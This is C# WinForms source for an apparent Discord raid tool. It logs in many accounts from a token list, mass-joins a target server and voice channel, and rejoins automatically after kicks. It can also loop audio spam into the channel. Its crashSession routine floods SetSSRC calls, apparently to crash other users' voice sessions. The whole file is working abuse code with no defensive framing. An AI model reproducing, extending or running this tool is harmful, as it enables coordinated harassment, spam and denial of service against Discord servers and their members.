using System.Windows.Forms;
using System.Threading;
using System;
using System.Runtime;
using System.Runtime.InteropServices;
using System.Diagnostics;
using Microsoft.VisualBasic;
using Discord.Gateway;
using Discord;
public partial class MainForm : Form
{
    [DllImport("psapi.dll")]
    static extern int EmptyWorkingSet(IntPtr hwProc);
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetProcessWorkingSetSize(IntPtr process, UIntPtr minimumWorkingSetSize, UIntPtr maximumWorkingSetSize);
    public MainForm()
    {
        InitializeComponent();
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        CheckForIllegalCrossThreadCalls = false;
        new Thread(new ThreadStart(clearRam)).Start();
    }
    public void clearRam()
    {
        while (true)
        {
            Thread.Sleep(1000);
            EmptyWorkingSet(Process.GetCurrentProcess().Handle);
            GCSettings.LargeObjectHeapCompactionMode = GCLargeObjectHeapCompactionMode.CompactOnce;
            GC.Collect(GC.MaxGeneration);
            GC.WaitForPendingFinalizers();
            SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, (UIntPtr)0xFFFFFFFF, (UIntPtr)0xFFFFFFFF);
        }
    }
    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        Process.GetCurrentProcess().Kill();
    }
    private void firefoxRadioButton1_CheckedChanged(object sender, EventArgs e)
    {
        trackBar1.Visible = false;
        trackBar2.Visible = false;
        trackBar3.Visible = true;
        label16.Text = "Delay: " + trackBar3.Value.ToString() + "ms";
    }
    private void firefoxRadioButton2_CheckedChanged(object sender, EventArgs e)
    {
        trackBar3.Visible = false;
        trackBar1.Visible = true;
        trackBar2.Visible = true;
        label16.Text = "Delay: " + trackBar1.Value.ToString() + "-" + trackBar2.Value.ToString() + "ms";
    }
    private void trackBar1_Scroll(object sender, EventArgs e)
    {
        label16.Text = "Delay: " + trackBar1.Value.ToString() + "-" + trackBar2.Value.ToString() + "ms";
    }
    private void trackBar2_Scroll(object sender, EventArgs e)
    {
        label16.Text = "Delay: " + trackBar1.Value.ToString() + "-" + trackBar2.Value.ToString() + "ms";
    }
    private void trackBar3_Scroll(object sender, EventArgs e)
    {
        label16.Text = "Delay: " + trackBar3.Value.ToString() + "ms";
    }
    private void firefoxRadioButton4_CheckedChanged(object sender, EventArgs e)
    {
        trackBar5.Visible = false;
        trackBar4.Visible = false;
        trackBar6.Visible = true;
        label1.Text = "Delay: " + trackBar6.Value.ToString() + "ms";
    }
    private void firefoxRadioButton3_CheckedChanged(object sender, EventArgs e)
    {
        trackBar6.Visible = false;
        trackBar5.Visible = true;
        trackBar4.Visible = true;   
        label1.Text = "Delay: " + trackBar5.Value.ToString() + "-" + trackBar4.Value.ToString() + "ms";
    }
    private void trackBar5_Scroll(object sender, EventArgs e)
    {
        label1.Text = "Delay: " + trackBar5.Value.ToString() + "-" + trackBar4.Value.ToString() + "ms";
    }
    private void trackBar4_Scroll(object sender, EventArgs e)
    {
        label1.Text = "Delay: " + trackBar5.Value.ToString() + "-" + trackBar4.Value.ToString() + "ms";
    }
    private void trackBar6_Scroll(object sender, EventArgs e)
    {
        label1.Text = "Delay: " + trackBar6.Value.ToString() + "ms";
    }
    private void firefoxButton11_Click(object sender, EventArgs e)
    {
        try
        {
            new Thread(new ThreadStart(doVocalJoiner)).Start();
        }
        catch (Exception ex)
        {
        }
    }
    public void doVocalJoiner()
    {
        try
        {
            foreach (string token in textBox14.Lines)
            {
                try
                {
                    Thread.Sleep(firefoxRadioButton2.Checked ? GetRandomNumber(trackBar2.Value, trackBar3.Value) : trackBar1.Value);
                    new Thread(() => joinVocal(token)).Start();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
    }
    public void joinVocal(string token)
    {
        try
        {
            DiscordSocketClient discordSocketClient = new DiscordSocketClient(null);
            discordSocketClient.Login(token);
            discordSocketClient.OnLoggedIn += DiscordSocketClient_OnLoggedIn;
            discordSocketClient.OnLeftGuild += DiscordSocketClient_OnLeftGuild;
        }
        catch (Exception ex)
        {
        }
    }
    private void DiscordSocketClient_OnLeftGuild(DiscordSocketClient client, GuildUnavailableEventArgs args)
    {
        try
        {
            client.JoinGuild(GetInviteCodeByInviteLink(textBox12.Text));
            client.Logout();
            DiscordSocketClient client1 = new DiscordSocketClient(null);
            client1.Login(client.Token);
            client1.OnLoggedIn += DiscordSocketClient_OnLoggedIn;
            client1.OnLeftGuild += DiscordSocketClient_OnLeftGuild;
        }
        catch (Exception ex)
        {
        }
    }
    private void DiscordSocketClient_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
    {
        try
        {
            client.JoinGuild(GetInviteCodeByInviteLink(textBox12.Text));
        }
        catch (Exception ex)
        {
        }
        Discord.Media.DiscordVoiceSession session = client.JoinVoiceChannel(new VoiceStateProperties() { ChannelId = ulong.Parse(textBox11.Text), GuildId = ulong.Parse(textBox1.Text), Muted = firefoxCheckBox19.Checked, Deafened = firefoxCheckBox20.Checked });
        session.ReceivePackets = false;
        session.OnConnected += Session_OnConnected;
        session.OnDisconnected += Session_OnDisconnected;
        session.Connect();
        if (firefoxCheckBox11.Checked)
        {
            Thread.Sleep(firefoxRadioButton3.Checked ? GetRandomNumber(trackBar5.Value, trackBar4.Value) : trackBar6.Value);
            session.Disconnect();
        }
    }
    private void Session_OnDisconnected(Discord.Media.DiscordVoiceSession session, Discord.Media.DiscordMediaCloseEventArgs args)
    {
        if (firefoxCheckBox4.Checked)
        {
            try
            {
                Discord.Media.DiscordVoiceSession session1 = session.Client.JoinVoiceChannel(new VoiceStateProperties() { ChannelId = session.Channel.Id, GuildId = session.Guild.Id, Muted = firefoxCheckBox19.Checked, Deafened = firefoxCheckBox20.Checked });
                session1.ReceivePackets = false;
                session1.OnConnected += Session_OnConnected;
                session1.OnDisconnected += Session_OnDisconnected;
                session1.Connect();
            }
            catch (Exception ex)
            {
            }
        }
    }
    public void goLive(Discord.Media.DiscordVoiceSession session)
    {
        try
        {
            session.GoLive();
        }
        catch (Exception ex)
        {
        }
    }
    public void watchGoLive(Discord.Media.DiscordVoiceSession session)
    {
        try
        {
            session.WatchGoLive(ulong.Parse(textBox2.Text));
        }
        catch (Exception ex)
        {
        }
    }
    private void Session_OnConnected(Discord.Media.DiscordVoiceSession session, EventArgs e)
    {
        if (firefoxCheckBox1.Checked)
        {
            try
            {
                new Thread(() => crashSession(session)).Start();
            }
            catch (Exception ex)
            {
            }
        }
        if (firefoxCheckBox2.Checked)
        {
            try
            {
                new Thread(() => goLive(session)).Start();
            }
            catch (Exception ex)
            {
            }
        }
        if (firefoxCheckBox3.Checked)
        {
            try
            {
                new Thread(() => watchGoLive(session)).Start();
            }
            catch (Exception ex)
            {
            }
        }
        if (firefoxCheckBox18.Checked)
        {
            Discord.Media.DiscordVoiceStream discordVoiceStream = session.CreateStream(96000u, Discord.Media.AudioApplication.Mixed);
            session.SetSpeakingState(Discord.Media.DiscordSpeakingFlags.Soundshare);
            if (firefoxRadioButton6.Checked)
            {
                for (int i = 0; i < numericUpDown12.Value; i++)
                {
                    if (System.IO.File.Exists(textBox16.Text))
                    {
                        try
                        {
                            discordVoiceStream.CopyFrom(Discord.Media.DiscordVoiceUtils.GetAudioStream(textBox16.Text));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
            else
            {
                for (;;)
                {
                    if (System.IO.File.Exists(textBox16.Text))
                    {
                        try
                        {
                            discordVoiceStream.CopyFrom(Discord.Media.DiscordVoiceUtils.GetAudioStream(textBox16.Text));
                        }
                        catch (Exception ex)
                        {
                        }
                    }
                }
            }
        }
    }
    public void crashSession(Discord.Media.DiscordVoiceSession session)
    {
        try
        {
            try
            {
                while (session.State == Discord.Media.MediaSessionState.Authenticated)
                {
                    try
                    {
                        for (uint i = 1; i < 1000000; i++)
                        {
                            try
                            {
                                session.SetSSRC(i);
                            }
                            catch (Exception ex)
                            {
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            catch (Exception ex)
            {
            }
        }
        catch (InvalidOperationException)
        {
        }
    }
    public static Random rand = new Random();
    public static int GetRandomNumber(int min, int cap)
    {
        return rand.Next(min, cap);
    }
    public static string GetInviteCodeByInviteLink(string inviteLink)
    {
        try
        {
            if (inviteLink.EndsWith("/"))
            {
                inviteLink = inviteLink.Substring(0, inviteLink.Length - 1);
            }
            if (inviteLink.Contains("discord") && inviteLink.Contains("/") && inviteLink.Contains("http"))
            {
                string[] splitter = Strings.Split(inviteLink, "/");
                return splitter[splitter.Length - 1];
            }
        }
        catch (Exception ex)
        {
        }
        return inviteLink;
    }
    private void firefoxButton14_Click(object sender, EventArgs e)
    {
        if (openFileDialog2.ShowDialog() == DialogResult.OK)
        {
            textBox16.Text = openFileDialog2.FileName;
        }
    }
    private void firefoxButton13_Click(object sender, EventArgs e)
    {
        if (openFileDialog1.ShowDialog() == DialogResult.OK)
        {
            textBox14.Text = System.IO.File.ReadAllText(openFileDialog1.FileName);
        }
    }
}